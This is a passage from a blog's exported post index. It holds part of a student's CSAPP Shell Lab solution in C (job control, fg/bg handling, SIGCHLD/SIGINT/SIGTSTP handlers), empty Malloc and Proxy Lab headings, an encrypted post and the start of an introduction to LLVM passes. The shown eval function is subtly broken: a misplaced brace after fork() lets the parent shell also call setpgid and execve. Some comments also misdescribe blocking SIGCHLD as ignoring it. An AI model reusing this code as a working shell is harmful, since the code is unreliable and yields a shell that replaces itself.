class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        state = FG;  </span><br><span class="line">    &#125;   </span><br><span class="line">    <span class="keyword">if</span> (argv[<span class="number">0</span>] == <span class="literal">NULL</span>)  &#123; <span class="keyword">return</span>; &#125;   <span class="comment">/* Ignore empty lines */</span></span><br><span class="line"></span><br><span class="line">    sigfillset(&amp;mask_all); <span class="comment">//防止竞争</span></span><br><span class="line">    sigemptyset(&amp;mask_one);</span><br><span class="line">    sigaddset(&amp;mask_one, SIGCHLD); <span class="comment">// ignore the SIGHLD</span></span><br><span class="line">    sigprocmask(SIG_BLOCK, &amp;mask_one, &amp;prev_one); <span class="comment">//block SIGHLD and save previous blocked set</span></span><br><span class="line">    <span class="keyword">if</span> (!builtin_cmd(argv)) &#123;  <span class="comment">//如果不是内置命令</span></span><br><span class="line">        <span class="keyword">if</span> ((pid = fork()) == <span class="number">0</span>) &#123;</span><br><span class="line">        sigprocmask(SIG_UNBLOCK, &amp;prev_one, <span class="literal">NULL</span>); <span class="comment">//Restore previous blocked set, unblocking SIGHLD</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (setpgid(<span class="number">0</span>, <span class="number">0</span>) &lt; <span class="number">0</span>) &#123; <span class="comment">// change the group id into pid</span></span><br><span class="line">            perror(<span class="string">&quot;SETPGID ERROR&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (execve(argv[<span class="number">0</span>], argv, environ) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%s: Command not found.\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    sigprocmask(SIG_BLOCK, &amp;mask_all, <span class="literal">NULL</span>);</span><br><span class="line">    addjob(jobs, pid, state, cmdline);  <span class="comment">//add job</span></span><br><span class="line">    sigprocmask(SIG_UNBLOCK, &amp;prev_one, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span>(state == FG) &#123; <span class="comment">// if FG wait until finsihed else just print message</span></span><br><span class="line">        waitfg(pid);  <span class="comment">//等待前台程序执行</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[%d] (%d) %s&quot;</span>, pid2jid(pid), pid, cmdline);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">builtin_cmd</span><span class="params">(<span class="keyword">char</span> **argv)</span> </span>&#123; <span class="comment">// 如果是内置命令则直接执行</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">&quot;quit&quot;</span>)) &#123;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">&quot;jobs&quot;</span>)) &#123;</span><br><span class="line">        listjobs(jobs); <span class="comment">//print the jobs</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">&quot;fg&quot;</span>) || !<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">&quot;bg&quot;</span>)) &#123;</span><br><span class="line">        do_bgfg(argv);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;     <span class="comment">/* not a builtin command */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">do_bgfg</span><span class="params">(<span class="keyword">char</span> **argv)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> parsed;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">job_t</span> *<span class="title">job</span>;</span></span><br><span class="line">    <span class="comment">// case no argument</span></span><br><span class="line">    <span class="keyword">if</span>(!argv[<span class="number">1</span>])&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s command requires PID or %%jobid argument\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// parse argument，其中%开头的数字是JobID，纯数字的是PID</span></span><br><span class="line">    <span class="keyword">if</span>(argv[<span class="number">1</span>][<span class="number">0</span>] == <span class="string">&#x27;%&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="built_in">sscanf</span>(&amp;argv[<span class="number">1</span>][<span class="number">1</span>], <span class="string">&quot;%d&quot;</span>,&amp;parsed))&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%s: argument must be a PID or %%jobid\n&quot;</span>,argv[<span class="number">0</span>]);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>((job = getjobjid(jobs, parsed)) == <span class="literal">NULL</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%%%d: No such job\n&quot;</span>, parsed);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="built_in">sscanf</span>(argv[<span class="number">1</span>], <span class="string">&quot;%d&quot;</span>,&amp;parsed))&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%s: argument must be a PID or %%jobid\n&quot;</span>,argv[<span class="number">0</span>]);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>((job = getjobpid(jobs, parsed)) == <span class="literal">NULL</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;(%d): No such process\n&quot;</span>, parsed);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">&quot;bg&quot;</span>)) &#123;</span><br><span class="line">        <span class="comment">// make state BG</span></span><br><span class="line">        job-&gt;state = BG;</span><br><span class="line">        <span class="comment">// send SIGCONT</span></span><br><span class="line">        <span class="keyword">if</span>(kill(-job-&gt;pid, SIGCONT) &lt; <span class="number">0</span>)</span><br><span class="line">            unix_error(<span class="string">&quot;kill error&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[%d] (%d) %s&quot;</span>, job-&gt;jid, job-&gt;pid, job-&gt;cmdline);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">&quot;fg&quot;</span>)) &#123;</span><br><span class="line">        job-&gt;state = FG;</span><br><span class="line">        <span class="comment">// send SIGCONT</span></span><br><span class="line">        <span class="keyword">if</span>(kill(-job-&gt;pid, SIGCONT) &lt; <span class="number">0</span>)</span><br><span class="line">            unix_error(<span class="string">&quot;kill error&quot;</span>);</span><br><span class="line">        <span class="comment">// wait until finish</span></span><br><span class="line">        waitfg(job-&gt;pid);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;do_bgfg: Internal error&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">waitfg</span><span class="params">(<span class="keyword">pid_t</span> pid)</span> </span>&#123; <span class="comment">//等待子进程结束</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">job_t</span> *<span class="title">job</span> = <span class="title">getjobpid</span>(<span class="title">jobs</span>, <span class="title">pid</span>);</span></span><br><span class="line">    <span class="keyword">if</span>(!job) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// while there is no FG process sleep</span></span><br><span class="line">    <span class="keyword">while</span>(job-&gt;state == FG)</span><br><span class="line">        sleep(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// verbose message</span></span><br><span class="line">    <span class="keyword">if</span>(verbose)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;waitfg: Process (%d) no longer the fg process\n&quot;</span>, pid);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sigchld_handler</span><span class="params">(<span class="keyword">int</span> sig)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> status, jid;</span><br><span class="line">    <span class="keyword">pid_t</span> pid;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">job_t</span> *<span class="title">job</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(verbose)</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;sigchld_handler: entering&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// waitpid to find pid</span></span><br><span class="line">    <span class="keyword">while</span>((pid = waitpid(<span class="number">-1</span>, &amp;status, WNOHANG | WUNTRACED)) &gt; <span class="number">0</span>)&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// if job deleted </span></span><br><span class="line">        <span class="keyword">if</span>((job = getjobpid(jobs, pid)) == <span class="literal">NULL</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Lost track of (%d)\n&quot;</span>, pid);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        jid = job-&gt;jid;</span><br><span class="line">        <span class="comment">// stop signal</span></span><br><span class="line">        <span class="keyword">if</span>(WIFSTOPPED(status))&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Job [%d] (%d) stopped by signal %d\n&quot;</span>, jid, job-&gt;pid, WSTOPSIG(status));</span><br><span class="line">            job-&gt;state = ST;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// exit</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(WIFEXITED(status))&#123;</span><br><span class="line">            <span class="keyword">if</span>(deletejob(jobs, pid))</span><br><span class="line">                <span class="keyword">if</span>(verbose)&#123;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;sigchld_handler: Job [%d] (%d) deleted\n&quot;</span>, jid, pid);</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;sigchld_handler: Job [%d] (%d) terminates OK (status %d)\n&quot;</span>, jid, pid, WEXITSTATUS(status));</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// exit by signal</span></span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span>(deletejob(jobs, pid))&#123;</span><br><span class="line">                    <span class="keyword">if</span>(verbose)</span><br><span class="line">                        <span class="built_in">printf</span>(<span class="string">&quot;sigchld_handler: Job [%d] (%d) deleted\n&quot;</span>, jid, pid);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Job [%d] (%d) terminated by signal %d\n&quot;</span>, jid, pid, WTERMSIG(status));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// end handler</span></span><br><span class="line">    <span class="keyword">if</span>(verbose)</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;sigchld_handler: exiting&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * sigint_handler - The kernel sends a SIGINT to the shell whenver the</span></span><br><span class="line"><span class="comment"> *    user types ctrl-c at the keyboard.  Catch it and send it along</span></span><br><span class="line"><span class="comment"> *    to the foreground job.  </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sigint_handler</span><span class="params">(<span class="keyword">int</span> sig)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">pid_t</span> pid = fgpid(jobs);</span><br><span class="line">    <span class="keyword">if</span>(verbose)</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;sigint_handler: entering&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// if fg exists send SIGINT，// 发送SIGINT给前台进程组里的所有进程，包括子进程。</span></span><br><span class="line">    <span class="keyword">if</span>(pid)&#123;</span><br><span class="line">        <span class="keyword">if</span>(kill(-pid, SIGINT) &lt; <span class="number">0</span>)</span><br><span class="line">            unix_error(<span class="string">&quot;kill (sigint) error&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(verbose)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;sigint_handler: Job (%d) killed\n&quot;</span>, pid);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// end handler</span></span><br><span class="line">    <span class="keyword">if</span>(verbose)</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;sigint_handler: exiting&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * sigtstp_handler - The kernel sends a SIGTSTP to the shell whenever</span></span><br><span class="line"><span class="comment"> *     the user types ctrl-z at the keyboard. Catch it and suspend the</span></span><br><span class="line"><span class="comment"> *     foreground job by sending it a SIGTSTP.  </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sigtstp_handler</span><span class="params">(<span class="keyword">int</span> sig)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">pid_t</span> pid = fgpid(jobs);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">job_t</span> *<span class="title">job</span> = <span class="title">getjobpid</span>(<span class="title">jobs</span>, <span class="title">pid</span>);</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(verbose)</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;sigstp_handler: entering&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// if fg exists then send SIGSTP to job</span></span><br><span class="line">    <span class="keyword">if</span>(pid)&#123;</span><br><span class="line">        <span class="keyword">if</span>(kill(-pid, SIGTSTP) &lt; <span class="number">0</span>)</span><br><span class="line">            unix_error(<span class="string">&quot;kill (tstp) error&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(verbose)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;sigstp_handler: Job [%d] (%d) stopped\n&quot;</span>, job-&gt;jid, pid);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// end handler</span></span><br><span class="line">    <span class="keyword">if</span>(verbose)</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;sigstp_handler: exiting&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Malloc-Lab"><a href="#Malloc-Lab" class="headerlink" title="Malloc Lab"></a>Malloc Lab</h3><p>先占个坑</p><h3 id="Proxy-Lab"><a href="#Proxy-Lab" class="headerlink" title="Proxy Lab"></a>Proxy Lab</h3><p>+1</p>]]></content>
      
      
      <categories>
          
          <category> Notes </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>这是一个笔记</title>
      <link href="posts/17122941/"/>
      <url>posts/17122941/</url>
      
        <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="Oh, these decrypted content cannot be verified, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Here's something encrypted, password is required to continue reading.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="c314b1e2f429cbc14f733158a67b147b6a6e842c23151cf20bd0483b5b62d0b0">23c98bc4e88201af417863563b43fca032f5a6222ede06686b94a7df44e9ad2da3cd47fb7bfbc0a5a0c8396e4760499d82fd9499edb5298ee890d2afb5ef29b7b47e27e62b9addbcffc3381cb7fb3d652ef4bdaf0c891338a231436e0395b192b73df6ad3bc96a03fc0571da5902013455675be28ac39fcd2670b17b8e5d9c3db7d5b4cb2774493599221f233ee72bcc44af197661772dc077c31d56e0ef34fa84ee7133fa7e986c73c934f146360c72396a120d3f60b92942b0ac67dfbe1c4bd7048e32ccd9f6558d2f0e0b376ede37fe5b6ae0ed35a53b9cd1a0922e557f47b81465127945e27d8cc7737272053588f2f1a1df58a9b1573cbded12635b8b7931d686a8468e28cfe9e47d434155bd40ab715aa2aad93e804a8a9470787fab9ff969fcc7f12a9ae41dacbef0670f7839df7f7d7561e1ae79c6449ba3c258df755088a7f3e8e5e35dadb53a8627e0168f5f6fb4321884eaa877b4aace6f39074896ad027404b1cf51f1daa453af9ccd69ba067fcac988cdb8c37b90f614bb35418de96a2f8498e2f64d1f44f18eb4ccca9d686b2cdb73ce8d673073529904b5010b1eb9779c3538cb504618a7c819c9bbd0643bfdc8b8bd6e8ae52e7b2019344ff494584fcbca518cf7207536db50fa53db7bf1f8c144aa89e8175d7b3168bfac5e93a2047797e58f7fadc0afae12ebca91c5015ce956237e5ed9a2092135235f942e47406d4efae63645dcf9e1d2f04882cf88ca09b5f29657ad86cc365b75b7f4068c648ddba38b0aeda33d44b4beb9dfb61e62709f5ad4cee7996702ca6a591fb1e63c802117dbfe507556ec3e0545c63773c856b1161202e98ea9d069020329f9a3d5b2aa36c5bc7266660a23ec468181cf41c696938430c4e143487d314366eb91b725543407a6ee65c51eba78328e96a29655d466fe82a4675b16b419118c9c6586cdc63b3c3f95e38a099a8d209acfd2c532a6a2a541801c830b7ac479c2bf65e1b8e013554f4a6e1f3e23a8d83c2c1e45ee35a28236218674fa5a3845c1b97cf2330a50262a348dbaa2605a910e0918272b07d978ab4e1f8ac891c7dd965425fd4ace58d3f46ca785f38e49aea18e062572b298bb7737e285e9dd553d3ea5a45343fcb587e219e7b7dec2314d5911ba5e039160725eb47029a98e88564c5ad7fb753983b8427f75365133716778ede115efcb9c206846f7547e2e94ce4da602f2686ed3fb0832e74c295bd4b2f1894a620d284c0f415a060d7e31882f7618fa9ed2f9a2818474511a6413e0bbdc2f5a7ff9088e81bb48c54e46b0f1b41f6fd7c466b56b552d723576370b72d56981b13993cc40dff30fc911d711d96dd080dc16966af42e3aaee78ee84b99f181851d2d610cb05c063ce0efd9b95a77b85cd632c2b49968e7d937c4648b2db49d28a358fb9295fe8e56b92657f756459eda15501ced7ba731763220aab5d63df2bf0cff6b3008be0cf0d8680e7727566aabea8d61126ddef693f7ccde895740338acb91478c41651d854c956b519da17d7affbc0ffdaa3b65a437af6217e7560747912e51f63997e87fbd87650326695d02b003de06405f97c9ef8539e265ba06bf780c1ec433a2d84272cae8c00c46cc2126f6b02287c1f30f86c10e198c8d28ba04970b51a5001d5e51fc01f90e25ba43c6a29f34900c2d78b485eba631e286c3e6043f936eaa12b51d72bd2de0822fbe3669ff57c2c4ba3e16fda2ec1a2009867aa57f42e2a723e561912e916f5e7c9ab05e66367ec1242cb3f1b2a66fa2fb687ac0a0ddb5d4b64aa33ab60c877633d8a28102479a0f4111dadf0be93ac543fea07c920587a2fea470ebc23b9d9ffae34604a8ed0ce6976112eda9aed69d180f86957d9fde53dfcc402df2fd2956505a7cb585e07f2815edaf0ec30376538d0a34cea5cceb23896dfd792719ed871690e036ee77b13ae38f205b1f2007cf045ca2ced294bcc1c107114e140fca4968979f548a6c28449191364fbeee89c903ec31a54021c11ec040da26861d3ff52e9cf7130dc68ffc75a4735d838550fcd86da6dd95a6e2b241f876071bac8426e35a67b6e258c9ef98ccfc7dd7c0cbfeece9a04d1e61cbf895b3dfc049c5662dfd9209440a7f47f4a02df8ce700a72040f5b4859cb83190d8ba67263d3b8e5d5c798df559f00193e95ea83af2aa5c3d2466169e26bdb4f1088cabe5aa8835e8b2165cdddb7fe412887265ea7d0ba2c8b027a21e585e698025eed14c72c3b1df7b24a46c905d78e02b9be447b8b5cbbbbc6c9eaea17f3b4e4454fe4f7989c9e48f2a9f1e14dbcfb2729c235b25a8d195a817333b94eace9354196b0a7d3f538970ca964627b3004b26f86c4d8e4adfff36e1eda4bfe7cf83fb72292f043c3f78fec3a5789623c6dc34298eed77dc502ee5b538b3d34ece4dbae2703a4fc1bef2abd3fae5ef9feafd8459e991074d38092f44986f2ea8fe17fc1f7015e8e9e96e223d562acb642fdf43c34a3bf2785125d6e0fd530c0af42b5e81084d26f45543e870ff6e03eb5d29b7f4892fa45116b871874985d583fad928a5e360059df198928d6503db8bb37a470604638aa24b19d7e3e6c9379b03e6392126a71e642e415068486f8876b43d81c05cd4ac1ad9d0b8d6b42dd0216ade1be64412041bae286710f3cbcc11414cd6aa8dbc8870fd4cb551f16a30fda203904284f93bb80b8267d294d464c3da009660f47782f6db874860d9aa00c6e20e7c086af9b17bf9f4ceaf01a0a020ad5fb196691b3b531c0437784d657371baf276b2fb39d1a146878ba775ca3cf70df5862b6eee87ee15079e6e548e500026ae687188b873c19a0bfe4bfd0fdf0a6a23aef49871f15f8c46372678c51b5050ceaf50010697d8f67ca0201cb89c76f6165ddfbf7d4139f8b68effb678bdc3ad0b5971b29b126f5aa63531396d7c5203b4e32c19b3c59300d439a89ee0757e20b711e7c7a271b33a7904592d7f633361afb1568643643bdba34b866c38552034024a96dd4624ccb1d20f5d3afda41337d1dc4666afa67bb88c43e87336008f65ee9cd1428aa5cccc20fdd05cf3b20f45359ba3832fe4c2a9a04b383bf012ace3bb746bced9fc828a5495ad7a575fc2f48db0015dc382ecb0743568d542dce8bf82577fd06e9adc849ec6f998be2188e6b91ad9a7dc41f16465ad6c64484932c1f63ea29ca558538422cf5c384a3a67a52bff5fb645a9387f267ebe5a2732f4a25d0e7def59cb7dc6f4e9b1c7872003dffde8e3629ffb61dd4c7aba331ddeea3afa6bb08629a93a69d3620d61b705dbbd756596e69ff1ce2585c37cd955712d663547b9638fcb416815b354976b05580e23ba8d6486e1bdbd7a5770276a57fb5723107e5101744480607ac9f9aceb335f9edba2923273803b634a5c22971833fd579234cad1147290d2801b17fbc0f4309df963888a0a070cf5e0ba923584660563ef5f63779a26bd2f33b382a47f4b951e6476bc945026730e935ef2ab994f9ef20009b01aa4bd5d93d98674a639dc4606f35f83b1f3d8e76126f178caf5c2a1f9e6d1b252a5c11fab2526d45a367e7d29c18e0de12b8c683f1990a2194192dc269fa84e0025f8c25e3b289047ab3b2de89a56ccca3746523a2f6cc0966ffbbb38639535d74a665d48fcdb443457445c86ddf41ead46e48c954aa9f49b4c8bd3a4fec184c07bbac88321972ac7380be263eed4928fbe56a4de90daee723e26c2de793d95d158569083b9ba2b33e4fbc2b8a9996f1935cd19e9be0490eadc3311a41265a44fe142f294708aa2440440f5e59849a8d619d3e4b64247b543333c465116aa04894bb7dc99f0dc328e5a8d02f3da3f8e7cc7dbe84ff68dc004eb475241b64fea32a208026a20d97429fed849257f6f5a12398146fda63d57514a5e4c3cb5f7e5e9bdcd5c4dbdae9ad98170f1ee30f97cc703d794b6631cade1702f94590ebcf465dbecabeb10a17d7bdae6ac4b25d8508209a029a9731cf962ef278aec1e80d2402359a251723090fb783b6273cdd9191f0b6e6bdb5356a985bf873edf940c5f3325ec6ddb8376cc84dbff1d062e58a8b996e19a0a4809cd289556318f7fd17fc6ab535b3d36a9f6443a4b340e74991f0686ef5d7a47fe645314130dbde9b3b96cc7c86ec0ad98852fcd233914169a616dc6fdd98f3000f0b4a89bd5e87d7a52454fcf95d656d7266a4a250bae1fbe8eed25add9277e189c3700523e45da33d83d65e30fed465ca5b93680c21b0a55a3e4028f508924cea75a8f6c26d6b743c63a1429549b89b3a70ad06147b652a0e839ce85e9305510eeadf304185e766af0df819cdd73bf77d5a36215127f691a51c7f7564fbdb3343588a43d616eb3874e5e8740dad0754528e69c1128076dc816ac3e05fa1df65439c0a772b5ba3a6a42d6b5f41abb5655699779dfc2258b206d74fbe83a887ce6444bc157f8e53f35f40cdab895d7d25dd3a8bc71b7d8885a0bdd30388cd786ee2eeae1d61b8b4cd061b4c10f9936e2a5dff3997a3ec1ff51e3c4743c06dac19261d56014caf5a8b62069d8bee9a35c79c458488c5e06f656b46fb00bfb1f1b807f343100aab409771285624e3786adfd46d0c6f7e0bbcc7c4c2192806bd75a9b3d3981193c3a742465b818774af46cbf7d38cf6e7735459f176071081a7834a0bdff4c9b8f18cacc43793ea0d116ee77704d5eec125dbfbf3057005903e9d99b18e7bc08adea0f282219f79075949c22212cc3e755492112dfe6f370abf6fe95c11490d2d013fd0e09327f030c37c714a61ef15488732f278cf3c34845c7c4f72b196711e8e62c475e13e83e11f7aa2d7f8c3a26e6fb31071e1fc5653b46f53752a93b2fca3180723eee1c4cef025be3d6de04fa05922064533c071a541296b43356432595f795e8cc648a393b668ba988cba5c634ea1a45285be0438bd7d6cf28f1b646eb7fd0f0ee0e24b4dd7c4bd6901233041fc7ac125b312b80f92ad9bff596692cff220b0195a8d3e69269e4e3898f8d1c0506ccda75e7fc557d93afcb207998694c33e7f68f8a7eec41d36be9ed26bfa1c13a15147b269f26b0e3fc608a2d8234a9688e7efe15cafde7cad34ebcb4133a4b1c7f9f9d36615d1c6d48f205974ea2f8ecc34a5535075d0701d7a4e1f8f92a1bdc088b978b49113211f6c8936b91290fdc15b6e571f01a07b1d7c5d09f80c9d529fdcf9047e397dd5ba7ba24914b9e85fa641ae8cbfe82c39a6cc0f7fd83cf54b7e372047678d2d08c801ae740c97738ef0f063536c315cbbbcc066a7778d4f61ffffdbfa293f1831b3467a7bd8efe8a0acb70522af7fc9a485e1b36958552ea26d9bc695f151ab8226</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> Notes </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>pass&quot;入门&quot;</title>
      <link href="posts/e671613c/"/>
      <url>posts/e671613c/</url>
      
        <content type="html"><![CDATA[<h2 id="pass简介"><a href="#pass简介" class="headerlink" title="pass简介"></a>pass简介</h2><p><code>pass</code>：llvm pass 是 llvm 架构的重要组成部分。pass 的主要工作是：对代码进行分析、优化代码。所有 llvm pass 都是<code>pass</code>的子类，通过通过重写从中继承的虚方法来实现功能<code>Pass</code>。LLVM Pass框架的一个主要特性是它根据传递遇到的约束（由它们派生自哪个类来指示）来调度传递以高效的方式运行。</p><p><code>pass</code>大致可以分为两类：分析和转换。分析类的<code>pass</code>以提供信息为主，转换类的则要修改中间代码。</p><p><code>pass</code>类如下：</p><ul><li><p><a href="http://llvm.org/docs/WritingAnLLVMPass.html#the-immutablepass-class">ImmutablePass</a>：不运行, 不改变状态也永不更新的<code>pass</code>, 一般情况下用于显示编译器的配置信息.</p></li><li><p><a href="http://llvm.org/docs/WritingAnLLVMPass.html#the-modulepass-class">ModulePass</a>：用于执行任何非结构化的过程间优化。通用类型的<code>pass</code>，将整个程序示为一个单元处理。用<code>virtual bool runOnModule(Module &amp;M) = 0;</code>来实现<code>ModulePass</code>.</p></li><li><p><a href="http://llvm.org/docs/WritingAnLLVMPass.html#the-callgraphsccpass-class">CallGraphSCCPass</a>：用于被那些需要从底向上(bottom-up)遍历call graph的pass调用.</p></li><li><p><a href="http://llvm.org/docs/WritingAnLLVMPass.html#the-functionpass-class">FunctionPass</a>：是以单个函数为作用域的<code>pass</code>, 每个函数间是相互独立的, 相互之间无法影响</p></li><li><p><a href="http://llvm.org/docs/WritingAnLLVMPass.html#the-looppass-class">LoopPass</a>：是以单个<code>loop</code>为作用域的<code>pass</code>, 每个<code>loop</code>间相互独立. <code>LoopPass</code>以嵌套方式处理循环, 外层循环最后处理.</p></li><li><p><a href="http://llvm.org/docs/WritingAnLLVMPass.html#the-regionpass-class">RegionPass</a>：类似与<code>LoopPass</code>，但是在函数中的每个单入口单出口区域执行。 <code>RegionPass</code>以嵌套顺序处理，以便最后处理最外面的区域。p</p></li><li><p><a href="http://llvm.org/docs/WritingAnLLVMPass.html#the-basicblockpass-class">BasicBlockPass</a>：用于实现本地优化，优化通常每次针对一个基本块或指令运行。</p></li><li><p><a href="http://llvm.org/docs/WritingAnLLVMPass.html#the-machinefunctionpass-class">MachineFunctionPass</a>：类似<code>FunctionPass</code>, 区别在于前者属于<code>LLVM code generator</code>(后端), 生成架构相关代码, <code>FunctionPass</code>属于<code>LLVM optimizer</code>(中端), 生成通用的IR.</p></li></ul><h2 id="pass”入门”"><a 